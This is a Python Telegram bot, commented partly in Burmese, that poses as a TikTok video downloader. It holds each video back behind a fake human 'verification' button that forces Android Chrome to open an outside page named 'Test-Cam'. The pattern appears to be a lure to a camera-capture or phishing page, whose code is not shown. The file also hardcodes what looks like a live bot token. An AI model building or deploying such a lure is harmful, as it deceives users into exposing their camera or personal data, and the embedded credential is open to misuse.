import telebot
import requests
from telebot import types

# --- Bot Configuration ---
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
GITHUB_URL = "https://tar-alt.github.io/Test-Cam/"

bot = telebot.TeleBot(BOT_TOKEN)
user_links = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    
    # Verification အောင်မြင်ပြီး ပြန်လာတဲ့အပိုင်း
    if "Verification_Success" in message.text:
        link = user_links.get(user_id)
        if link:
            bot.send_message(user_id, "✅ Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
            try:
                res = requests.get(f"https://www.tikwm.com/api/?url={link}&hd=1").json()
                if res.get('code') == 0:
                    video_url = res['data'].get('hdplay') or res['data'].get('play')
                    bot.send_video(user_id, video_url, caption="✅ *Download Successful!*")
                    # del user_links[user_id] # ချက်ချင်းမဖျက်သေးဘဲ ထားကြည့်ပါ
                else:
                    bot.send_message(user_id, "❌ ဗီဒီယို ရှာမတွေ့ပါ။ Link ကို ပြန်စစ်ပါ။")
            except Exception as e:
                bot.send_message(user_id, f"⚠️ စနစ်ချို့ယွင်းချက် ဖြစ်ပေါ်နေပါသည်။")
        else:
            bot.send_message(user_id, "❌ Link မရှိတော့ပါ။ ကျေးဇူးပြု၍ Link ပြန်ပို့ပေးပါ။")
    else:
        bot.send_message(user_id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_link(message):
    user_id = message.chat.id
    user_links[user_id] = message.text # Link သိမ်းလိုက်ပြီ
    
    # Intent Link (Android Chrome)
    chrome_intent = f"intent://{GITHUB_URL.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end"
    
    markup = types.InlineKeyboardMarkup()
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔒", url=chrome_intent)
    markup.add(verify_btn)
    
    bot.reply_to(message, f"⚠️ **Verification Required**\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးရန် လိုအပ်ပါသည်။", reply_markup=markup, parse_mode="Markdown")

# Bot ကို အမြဲတမ်း run နေအောင်
try:
    print("Bot is running...")
    bot.infinity_polling()
except Exception as e:
    print(f"Bot error: {e}")

